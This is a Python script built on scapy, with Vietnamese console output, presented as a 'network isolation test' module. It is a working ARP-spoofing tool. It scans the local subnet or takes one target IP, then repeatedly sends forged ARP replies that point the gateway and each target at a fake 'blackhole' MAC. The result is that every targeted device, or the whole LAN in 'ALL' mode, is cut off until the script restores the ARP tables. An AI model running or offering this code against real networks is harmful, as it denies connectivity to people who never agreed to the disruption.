import os
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor

os.environ["PYTHONIOENCODING"] = "utf-8"
os.environ["PYTHONUTF8"] = "1"
if sys.stdout.encoding.lower() != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8')

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import ARP, Ether, sendp, srp, conf

try:
    from stop_flag import stop_requested
except Exception:
    def stop_requested(name=None):
        return False

try:
    from rich.console import Console
    from rich.panel import Panel
except ImportError:
    print("[-] Missing 'rich' library. Run: pip install rich")
    sys.exit(1)

console = Console(emoji=False)
is_running = True
targets = []

def restore_targets(gateway_ip, gateway_mac):
    errors = 0
    for target in targets:
        try:
            sendp(Ether(dst=target['mac'])/ARP(op=2, pdst=target['ip'], hwdst=target['mac'], psrc=gateway_ip, hwsrc=gateway_mac), count=3, verbose=False)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target['ip'], hwsrc=target['mac']), count=3, verbose=False)
        except Exception:
            errors += 1
    return errors

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=3, verbose=0)
    for snd, rcv in ans:
        return rcv[ARP].hwsrc
    return None

def scan_network(subnet, gateway_ip, attacker_ip):
    global targets
    import ipaddress
    import subprocess
    import socket
    console.print(f"[cyan][*] Đang thực hiện ARP Warm-up & Quét siêu tốc dải mạng {subnet}...[/cyan]")
    
    try:
        target_network = ipaddress.ip_network(subnet, strict=False)
    except:
        console.print("[red]Dải mạng không hợp lệ.[/red]")
        sys.exit(1)

    def force_ping(ip):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(b'', (ip, 1))
        except:
            pass

    if target_network.num_addresses <= 256:
        with ThreadPoolExecutor(max_workers=50) as executor:
            list(executor.map(force_ping, (str(ip) for ip in target_network.hosts())))

    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), timeout=0.8, retry=1, verbose=False)
    except:
        ans = []

    active_hosts = {}
    try:
        out = subprocess.check_output(["arp", "-a"], text=True, errors="ignore")
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 3 and "." in parts[0] and "-" in parts[1]:
                ip, mac = parts[0].strip(), parts[1].strip().replace("-", ":")
                try:
                    if ipaddress.ip_address(ip) in target_network:
                        active_hosts[ip] = mac
                except:
                    pass
    except Exception as exc:
        pass

    for _, rcv in ans:
        active_hosts[rcv[ARP].psrc] = rcv[ARP].hwsrc

    import socket, psutil
    local_ips = set()
    try:
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    local_ips.add(addr.address)
    except Exception:
        pass
    local_ips.add(gateway_ip)
    local_ips.add(attacker_ip)

    for ip, mac in active_hosts.items():
        if ip not in local_ips and mac != "ff:ff:ff:ff:ff:ff":
            targets.append({'ip': ip, 'mac': mac})
            console.print(f"[green][+] Đã định danh thiết bị:[/green] {ip} ({mac})")

def spoof_target(target, gateway_ip, gateway_mac):
    blackhole = "0a:0a:0a:0a:0a:0a" 
    while is_running:
        try:
            sendp(Ether(dst=target['mac'])/ARP(op=2, pdst=target['ip'], hwdst=target['mac'], psrc=gateway_ip, hwsrc=blackhole), verbose=False)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target['ip'], hwsrc=blackhole), verbose=False)
            time.sleep(1)
        except Exception:
            pass

def main():
    global is_running
    
    target_arg = sys.argv[1] if len(sys.argv) > 1 else "ALL"
    gateway_arg = sys.argv[2] if len(sys.argv) > 2 else None
    
    if target_arg.upper() == "ALL":
        console.print(Panel.fit("[bold red]KIỂM THỬ CÔ LẬP MẠNG (ALL SUBNET)[/bold red]\n[yellow]Cảnh báo: Sẽ ngắt kết nối TOÀN BỘ thiết bị trong mạng LAN.[/yellow]", border_style="red"))
    else:
        console.print(Panel.fit(f"[bold red]KIỂM THỬ CÔ LẬP MẠNG (SINGLE TARGET)[/bold red]\n[yellow]Cảnh báo: Chỉ cô lập duy nhất IP {target_arg}.[/yellow]", border_style="red"))
        
    try:
        if gateway_arg:
            gateway_ip = gateway_arg
        else:
            gateway_ip = conf.route.route("0.0.0.0")[2]
            if gateway_ip == "0.0.0.0":
                raise Exception("No default route")
    except:
        try:
            import subprocess
            from scapy.all import get_if_addr
            local_ip = get_if_addr(conf.iface)
            if local_ip in ("127.0.0.1", "0.0.0.0", None):
                raise Exception("Offline IP failed")
            gateway_cmd = (
                f"$i=(Get-NetIPAddress -AddressFamily IPv4 -IPAddress '{local_ip}' "
                "-ErrorAction Stop).InterfaceIndex; "
                "(Get-NetRoute -InterfaceIndex $i -DestinationPrefix '0.0.0.0/0' "
                "-ErrorAction Stop | Sort-Object RouteMetric | Select-Object -First 1 "
                "-ExpandProperty NextHop)"
            )
            gateway_ip = subprocess.check_output(
                ["powershell", "-NoProfile", "-Command", gateway_cmd],
                text=True, timeout=3, creationflags=subprocess.CREATE_NO_WINDOW,
            ).strip()
        except:
            console.print("[red]Lỗi: Không tự động tìm được Gateway. Vui lòng kiểm tra lại mạng.[/red]")
            sys.exit(1)

    try:
        attacker_ip = conf.route.route(gateway_ip)[1]
    except Exception as exc:
        console.print(f"[red]Không xác định được interface lab: {exc}[/red]")
        sys.exit(1)
    
    with console.status("[bold cyan]Đang xác định MAC của Router...[/bold cyan]", spinner="dots"):
        gateway_mac = get_mac(gateway_ip)
        
    if not gateway_mac:
        console.print("[red]Không tìm thấy MAC của Router. Kiểm tra lại Gateway IP.[/red]")
        sys.exit(1)
        
    if target_arg.upper() == "ALL":
        # Scan toàn mạng (Lấy subnet từ local IP)
        import ipaddress
        subnet = str(ipaddress.ip_network(f"{attacker_ip}/24", strict=False))
        scan_network(subnet, gateway_ip, attacker_ip)
    else:
        # Nhắm mục tiêu cụ thể
        target_mac = get_mac(target_arg)
        if target_mac:
            targets.append({'ip': target_arg, 'mac': target_mac})
            console.print(f"[green][+] Đã xác thực mục tiêu:[/green] {target_arg} ({target_mac})")
        else:
            console.print(f"[red][-] Không tìm thấy MAC của {target_arg}![/red]")
            sys.exit(1)
            
    if not targets:
        console.print("[yellow]Không tìm thấy mục tiêu nào trên mạng để kiểm thử.[/yellow]")
        sys.exit(0)
        
    console.print(f"\n[bold red]================ BẮT ĐẦU KIỂM THỬ (ARP SPOOFING) =================[/bold red]")
    console.print(f"[*] Tổng số mục tiêu bị cô lập: [bold yellow]{len(targets)}[/bold yellow] thiết bị")
    console.print(f"[*] Module đang chạy. Nhấn phím 'Q' trên Dashboard để dừng quá trình.\n")
    
    threads = []
    try:
        for target in targets:
            t = threading.Thread(target=spoof_target, args=(target, gateway_ip, gateway_mac))
            t.daemon = True
            threads.append(t)
            t.start()
        elapsed_sec = 0
        while True:
            time.sleep(1)
            elapsed_sec += 1
            if stop_requested("arp_kill"):
                console.print("[yellow][*] Nhận lệnh dừng từ dashboard — bắt đầu khôi phục ARP...[/yellow]")
                break
            if elapsed_sec % 5 == 0:
                console.print(f"[cyan][*] [ARP-KILL] Đang duy trì cô lập {len(targets)} thiết bị (Hoạt động: {elapsed_sec}s - Gói tin Blackhole phát liên tục)...[/cyan]")
    except KeyboardInterrupt:
        pass
    finally:
        is_running = False
        console.print("\n[yellow][*] Đang ngừng và khôi phục ARP cho toàn bộ mục tiêu...[/yellow]")
        for thread in threads:
            thread.join(timeout=2)
        errors = restore_targets(gateway_ip, gateway_mac)
        if errors:
            console.print(f"[red][-] Không thể xác nhận khôi phục cho {errors} mục tiêu.[/red]")
            sys.exit(1)
        else:
            console.print("[+] Đã gửi gói tin khôi phục ARP cho toàn bộ mục tiêu.")

if __name__ == "__main__":
    main()
